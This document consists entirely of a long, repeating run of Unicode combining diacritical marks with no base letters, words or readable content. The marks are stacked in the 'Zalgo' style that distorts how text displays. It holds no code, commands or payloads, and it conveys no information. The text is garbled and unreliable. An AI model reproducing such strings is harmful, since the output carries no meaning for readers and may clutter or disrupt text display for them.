̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽